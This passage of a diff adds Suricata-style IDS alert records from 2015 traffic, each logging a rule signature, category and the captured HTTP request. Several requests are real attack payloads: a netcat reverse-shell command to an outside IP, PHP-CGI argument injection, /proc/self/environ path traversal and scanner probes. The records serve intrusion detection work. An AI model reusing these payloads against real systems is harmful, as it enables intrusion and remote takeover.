+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "www.pwned.se",
+      "url": "/phpinfo/index.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+      "http_content_type": "image/gif",
+      "http_refer": "http://www.pwned.se/phpinfo/",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2146
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 649,
+      "bytes_toclient": 2603,
+      "start": "2015-03-18T03:04:09.815603-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:59:18.784347-0600",
+    "flow_id": 1740745629693786,
+    "pcap_cnt": 223838,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 49316,
+    "dest_ip": "198.61.250.104",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011227,
+      "rev": 5,
+      "signature": "ET POLICY User-Agent (NSIS_Inetc (Mozilla)) - Sometimes used by hostile installers",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "www.reimageplus.com",
+      "url": "/includes/uninstall_form.php?minorsessionid=cf35deb7b06d465dbf9f80d742&sessionid=593c3ef5-1746-4935-8eb3-6a63a953c233&question1=&question2=&question3=&name=&email=",
+      "http_user_agent": "NSIS_Inetc (Mozilla)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1159,
+      "bytes_toclient": 453,
+      "start": "2015-03-17T02:59:18.391002-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-12T06:48:50.494938-0600",
+    "flow_id": 936489888735334,
+    "pcap_cnt": 87594,
+    "event_type": "alert",
+    "src_ip": "217.195.49.146",
+    "src_port": 54378,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011465,
+      "rev": 7,
+      "signature": "ET WEB_SERVER /bin/sh In URI Possible Shell Command Execution Attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "www.pwned.se",
+      "url": "/skyblue/cm0.php?cmd=nc%20-e%20/bin/sh%20217.195.49.146%2063122",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 2,
+      "bytes_toserver": 679,
+      "bytes_toclient": 140,
+      "start": "2015-03-12T06:48:39.614502-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:48.373044-0600",
+    "flow_id": 530230432539618,
+    "pcap_cnt": 165962,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47661,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2011768,
+      "rev": 6,
+      "signature": "ET WEB_SERVER PHP tags in HTTP POST",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 209
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1208,
+      "bytes_toclient": 642,
+      "start": "2015-03-17T02:23:48.107490-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:05:59.726084-0600",
+    "flow_id": 760427724640433,
+    "pcap_cnt": 123328,
+    "event_type": "alert",
+    "src_ip": "83.170.87.175",
+    "src_port": 80,
+    "dest_ip": "192.168.0.51",
+    "dest_port": 58750,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2012059,
+      "rev": 2,
+      "signature": "ET WEB_CLIENT Hex Obfuscation of document.write % Encoding",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "www.alken.nl",
+      "url": "/web-security-check.htm",
+      "http_user_agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
+      "http_content_type": "text/html",
+      "http_refer": "http://www.google.se/url?sa=t&rct=j&q=&esrc=s&source=web&cd=14&cad=rja&uact=8&ved=0CFEQFjADOAo&url=http%3A%2F%2Fwww.alken.nl%2Fweb-security-check.htm&ei=WuAHVd6AIYjlywPYpoC4BA&usg=AFQjCNExlpPna2K5tG5ZFALGWztdHNSWZA&bvm=bv.88198703,d.bGQ",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 9465
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 11,
+      "pkts_toclient": 9,
+      "bytes_toserver": 1293,
+      "bytes_toclient": 11710,
+      "start": "2015-03-17T02:05:59.430257-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:12:19.019728-0600",
+    "flow_id": 1200846580899993,
+    "pcap_cnt": 137384,
+    "event_type": "alert",
+    "src_ip": "67.207.202.9",
+    "src_port": 47266,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2012230,
+      "rev": 4,
+      "signature": "ET WEB_SERVER Likely Malicious Request for /proc/self/environ",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "90.236.3.35",
+      "url": "/../../../../../proc/self/environ/phpinfo/index.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42",
+      "http_user_agent": "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.152 Safari/537.22",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 564,
+      "bytes_toclient": 690,
+      "start": "2015-03-17T02:12:18.549017-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-26T18:41:15.745972-0600",
+    "flow_id": 179261854661227,
+    "pcap_cnt": 3699,
+    "event_type": "alert",
+    "src_ip": "108.160.162.76",
+    "src_port": 443,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 63247,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2012647,
+      "rev": 4,
+      "signature": "ET POLICY Dropbox.com Offsite File Backup in Use",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "tls": {
+      "subject": "OU=Domain Control Validated, CN=*.dropbox.com",
+      "issuerdn": "C=US, ST=Arizona, L=Scottsdale, O=GoDaddy.com, Inc., OU=http://certs.godaddy.com/repository/, CN=Go Daddy Secure Certificate Authority - G2",
+      "serial": "03:F9:32:47:47:6E:47",
+      "fingerprint": "5a:93:b4:00:33:84:8e:48:c5:56:99:cb:ac:5c:35:a0:e3:c9:69:02",
+      "version": "TLSv1",
+      "notbefore": "2014-04-10T18:31:12",
+      "notafter": "2016-12-11T01:49:46"
+    },
+    "app_proto": "tls",
+    "flow": {
+      "pkts_toserver": 5,
+      "pkts_toclient": 6,
+      "bytes_toserver": 498,
+      "bytes_toclient": 4533,
+      "start": "2015-03-26T18:41:15.080491-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-26T18:00:38.783776-0600",
+    "flow_id": 1259188271904160,
+    "pcap_cnt": 60,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 17500,
+    "dest_ip": "255.255.255.255",
+    "dest_port": 17500,
+    "proto": "UDP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2012648,
+      "rev": 3,
+      "signature": "ET POLICY Dropbox Client Broadcasting",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "app_proto": "failed",
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 146,
+      "bytes_toclient": 0,
+      "start": "2015-03-26T18:00:38.783776-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T16:50:31.282953-0600",
+    "flow_id": 2034044421701607,
+    "pcap_cnt": 291207,
+    "event_type": "alert",
+    "src_ip": "192.168.0.53",
+    "src_port": 4999,
+    "dest_ip": "46.108.156.146",
+    "dest_port": 12212,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2012810,
+      "rev": 10,
+      "signature": "ET POLICY HTTP Request to a *.tk domain",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "cnbslqw.djpmhvfuewahl.tk",
+      "url": "/barnacle.html?destroy=50575&cave=42809&native=22536&severe=58937&wine=4879&attempt=89302&other=4134",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
+      "http_content_type": "text/html",
+      "http_refer": "http://2hood.eu/1/rx.php",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 577
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 1012,
+      "bytes_toclient": 948,
+      "start": "2015-04-07T16:50:30.098279-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:24:33.206788-0600",
+    "flow_id": 27186685835859,
+    "pcap_cnt": 170995,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 48691,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/index.php?-d+allow_url_include%3don+-d+safe_mode%3doff+-d+suhosin.simulation%3don+-d+open_basedir%3doff+-d+auto_prepend_file%3dphp%3a//input+-n",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
+      "http_content_type": "text/html",
+      "http_method": "POST",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 207
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 839,
+      "bytes_toclient": 640,
+      "start": "2015-03-17T02:24:32.948819-0600"
+    },
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013001,
+      "rev": 4,
+      "signature": "ET WEB_SERVER PHP Possible php Remote File Inclusion Attempt",
+      "category": "Web Application Attack",
+      "severity": 1
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:02:51.918214-0600",
+    "flow_id": 654565358434408,
+    "pcap_cnt": 121306,
+    "event_type": "alert",
+    "src_ip": "192.168.0.51",
+    "src_port": 35651,
+    "dest_ip": "90.236.3.35",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013028,
+      "rev": 4,
+      "signature": "ET POLICY curl User-Agent Outbound",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "90.236.3.35",
+      "url": "/",
+      "http_user_agent": "curl/7.37.1",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 1041
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 347,
+      "bytes_toclient": 1502,
+      "start": "2015-03-17T02:02:51.915560-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-15T18:51:00.593869-0600",
+    "flow_id": 724306119392280,
+    "pcap_cnt": 5213,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 59332,
+    "dest_ip": "107.21.127.37",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013031,
+      "rev": 5,
+      "signature": "ET POLICY Python-urllib/ Suspicious User Agent",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "update.uniblue.com",
+      "url": "/pm/version.txt?from=1.0.3.2",
+      "http_user_agent": "Python-urllib/2.7",
+      "http_content_type": "text/plain",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 302,
+      "redirect": "http://pm.uniblue.com.s3.amazonaws.com/latest_updates/application.txt",
+      "length": 69
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 388,
+      "bytes_toclient": 577,
+      "start": "2015-03-15T18:51:00.228376-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-26T11:02:13.489701-0600",
+    "flow_id": 1385411420356640,
+    "pcap_cnt": 101575,
+    "event_type": "alert",
+    "src_ip": "69.197.148.92",
+    "src_port": 44276,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013115,
+      "rev": 3,
+      "signature": "ET WEB_SERVER Muieblackcat scanner",
+      "category": "Attempted Information Leak",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "95.192.4.248",
+      "url": "/muieblackcat",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 210
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 410,
+      "bytes_toclient": 672,
+      "start": "2015-03-26T11:02:12.852000-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-13T05:36:39.267969-0600",
+    "flow_id": 932999164531111,
+    "pcap_cnt": 78990,
+    "event_type": "alert",
+    "src_ip": "54.230.98.75",
+    "src_port": 80,
+    "dest_ip": "192.168.0.54",
+    "dest_port": 52842,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013414,
+      "rev": 10,
+      "signature": "ET POLICY Executable served from Amazon S3",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "d2uu7l47sbf1ja.cloudfront.net",
+      "url": "/k9pcfixer/ip/2/setup.exe",
+      "http_user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36",
+      "http_content_type": "application/octet-stream",
+      "http_refer": "http://k9pcfixer.com/download_com/?utm_source=dcomnew_util_728&utm_campaign=dcomnew_util_728",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2261
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 6,
+      "bytes_toserver": 723,
+      "bytes_toclient": 5946,
+      "start": "2015-03-13T05:36:39.201127-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:23:40.759816-0600",
+    "flow_id": 250769794954278,
+    "pcap_cnt": 164654,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 47465,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013473,
+      "rev": 5,
+      "signature": "ET SCAN Apache mod_deflate DoS via many multiple byte Range values",
+      "category": "Attempted Denial of Service",
+      "severity": 2
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/",
+      "http_user_agent": "Apache Range Header Agent",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 206,
+      "length": 1041
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 575,
+      "bytes_toclient": 1634,
+      "start": "2015-03-17T02:23:40.488486-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-20T05:11:59.452110-0600",
+    "flow_id": 689200525422879,
+    "pcap_cnt": 66678,
+    "event_type": "alert",
+    "src_ip": "192.168.0.51",
+    "src_port": 45821,
+    "dest_ip": "130.239.18.165",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013504,
+      "rev": 5,
+      "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "category": "Not Suspicious Traffic",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "se.archive.ubuntu.com",
+      "url": "/ubuntu/pool/main/w/whois/whois_5.1.5_amd64.deb",
+      "http_user_agent": "Debian APT-HTTP/1.3 (1.0.9.2ubuntu2)",
+      "http_content_type": "application/x-debian-package",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 1139
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 415,
+      "bytes_toclient": 1594,
+      "start": "2015-03-20T05:11:59.340255-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-27T05:28:09.071834-0600",
+    "flow_id": 514319092042454,
+    "pcap_cnt": 66457,
+    "event_type": "alert",
+    "src_ip": "192.168.0.2",
+    "src_port": 52688,
+    "dest_ip": "88.150.173.218",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2013505,
+      "rev": 3,
+      "signature": "ET POLICY GNU/Linux YUM User-Agent Outbound likely related to package management",
+      "category": "Potential Corporate Privacy Violation",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "mirrorlist.centos.org",
+      "url": "/?release=7&arch=x86_64&repo=os&infra=stock",
+      "http_user_agent": "urlgrabber/3.10 yum/3.4.3",
+      "http_content_type": "text/plain",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 533
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 413,
+      "bytes_toclient": 988,
+      "start": "2015-03-27T05:28:08.936662-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-08T20:16:47.145163-0600",
+    "flow_id": 1941651116194580,
+    "pcap_cnt": 33836,
+    "event_type": "alert",
+    "src_ip": "66.135.38.206",
+    "src_port": 43497,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2014047,
+      "rev": 3,
+      "signature": "ET TROJAN Double HTTP/1.1 Header Inbound - Likely Hostile Traffic",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "flow": {
+      "pkts_toserver": 3,
+      "pkts_toclient": 2,
+      "bytes_toserver": 566,
+      "bytes_toclient": 148,
+      "start": "2015-04-08T20:16:46.064276-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-13T05:48:46.166276-0600",
+    "flow_id": 1233685577561603,
+    "pcap_cnt": 174478,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 53565,
+    "dest_ip": "162.209.122.21",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2014122,
+      "rev": 4,
+      "signature": "ET MALWARE W32/OpenCandy Adware Checkin",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "api.opencandy.com",
+      "url": "/?bn=1&bv=41.0.2272.89&clientv=103&cltzone=60&csk=16588997377832470999-09624453944537676288&language=sv,sv&method=get_offers&mstime=0.234&num_offers=2&os=WIN6.1SP1-64&product_key=15e24d1c80adabd288bb4ac80b4c4f9f&sswnt=C1ByJSNcFxBaQTY1alQnXRMGKE1SNENBKjVc&tm=2015-03-13%2010:49:10.860&v=1.0&signature=9bdebe6ca0dbe8885985afa661eb7796",
+      "http_content_type": "text/xml",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 1056
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 717,
+      "bytes_toclient": 1564,
+      "start": "2015-03-13T05:48:45.554499-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-16T03:33:57.006572-0600",
+    "flow_id": 1035467818818766,
+    "pcap_cnt": 99500,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 49200,
+    "dest_ip": "162.13.99.124",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2014137,
+      "rev": 3,
+      "signature": "ET MALWARE Common Adware Library ISX User Agent Detected",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "www.k9pcfixer.com",
+      "url": "/pcfixer/update/update.asp?build=first&ver=1.8.243.209&isreg=0&regkey=&telno=(855)%20716-7017&telnofr=",
+      "http_user_agent": "ISX Download DLL",
+      "http_content_type": "text/html",
+      "http_method": "HEAD",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 0
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 2,
+      "bytes_toserver": 472,
+      "bytes_toclient": 363,
+      "start": "2015-03-16T03:33:56.875726-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-11T05:48:24.684057-0600",
+    "flow_id": 1104500962652185,
+    "pcap_cnt": 37741,
+    "event_type": "alert",
+    "src_ip": "192.168.0.51",
+    "src_port": 12903,
+    "dest_ip": "192.168.0.1",
+    "dest_port": 53,
+    "proto": "UDP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2014169,
+      "rev": 2,
+      "signature": "ET DNS Query for .su TLD (Soviet Union) Often Malware Related",
+      "category": "Potentially Bad Traffic",
+      "severity": 2
+    },
+    "app_proto": "dns",
+    "flow": {
+      "pkts_toserver": 1,
+      "pkts_toclient": 0,
+      "bytes_toserver": 71,
+      "bytes_toclient": 0,
+      "start": "2015-03-11T05:48:24.684057-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-17T02:17:23.290702-0600",
+    "flow_id": 2124213029360441,
+    "pcap_cnt": 147110,
+    "event_type": "alert",
+    "src_ip": "54.235.163.229",
+    "src_port": 32834,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 59,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2015023,
+      "rev": 3,
+      "signature": "ET WEB_SERVER IIS 8.3 Filename With Wildcard (Possible File/Dir Bruteforce)",
+      "category": "Detection of a Network Scan",
+      "severity": 3
+    },
+    "http": {
+      "hostname": "host-90-236-3-35.mobileonline.telia.com",
+      "url": "/~1/",
+      "http_user_agent": "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 201
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 64,
+      "pkts_toclient": 62,
+      "bytes_toserver": 23252,
+      "bytes_toclient": 30010,
+      "start": "2015-03-17T02:17:14.250681-0600"
+    }
+  },
+  {
+    "timestamp": "2015-03-19T02:39:02.094206-0600",
+    "flow_id": 1229651471271007,
+    "pcap_cnt": 27900,
+    "event_type": "alert",
+    "src_ip": "192.168.0.54",
+    "src_port": 54021,
+    "dest_ip": "103.10.197.187",
+    "dest_port": 2703,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016097,
+      "rev": 4,
+      "signature": "ET TROJAN Unknown - Loader - Check .exe Updated",
+      "category": "A Network Trojan was detected",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "103.10.197.187",
+      "url": "/mtpr.exe",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+      "http_content_type": "application/x-msdos-program",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 200,
+      "length": 2391
+    },
+    "vars": {
+      "flowbits": {
+        "exe.no.referer": true
+      }
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 6,
+      "bytes_toserver": 668,
+      "bytes_toclient": 5754,
+      "start": "2015-03-19T02:39:00.296031-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-07T12:19:56.465866-0600",
+    "flow_id": 1768431842737753,
+    "pcap_cnt": 240830,
+    "event_type": "alert",
+    "src_ip": "104.130.247.52",
+    "src_port": 60687,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016184,
+      "rev": 5,
+      "signature": "ET WEB_SERVER ColdFusion administrator access",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "/CFIDE/administrator/",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 404,
+      "length": 218
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 3,
+      "bytes_toserver": 332,
+      "bytes_toclient": 625,
+      "start": "2015-04-07T12:19:55.507481-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-12T14:52:35.619308-0600",
+    "flow_id": 18575114087683,
+    "pcap_cnt": 166148,
+    "event_type": "alert",
+    "src_ip": "85.114.141.217",
+    "src_port": 46381,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "tx_id": 0,
+    "alert": {
+      "action": "allowed",
+      "gid": 1,
+      "signature_id": 2016222,
+      "rev": 2,
+      "signature": "ET SCAN GET with HTML tag in start of URI seen with PHPMyAdmin scanning",
+      "category": "Web Application Attack",
+      "severity": 1
+    },
+    "http": {
+      "hostname": "95.192.215.175",
+      "url": "<title>phpMyAdmin",
+      "http_user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
+      "http_content_type": "text/html",
+      "http_method": "GET",
+      "protocol": "HTTP/1.1",
+      "status": 400,
+      "length": 226
+    },
+    "app_proto": "http",
+    "flow": {
+      "pkts_toserver": 4,
+      "pkts_toclient": 4,
+      "bytes_toserver": 476,
+      "bytes_toclient": 690,
+      "start": "2015-04-12T14:52:35.503043-0600"
+    }
+  },
+  {
+    "timestamp": "2015-04-11T14:25:11.424711-0600",
+    "flow_id": 1715472267966383,
+    "pcap_cnt": 173758,
+    "event_type": "alert",
+    "src_ip": "45.63.7.209",
+    "src_port": 53806,
+    "dest_ip": "192.168.0.2",
+    "dest_port": 80,
+    "proto": "TCP",
+    "http": {
+      "hostname": "-c",
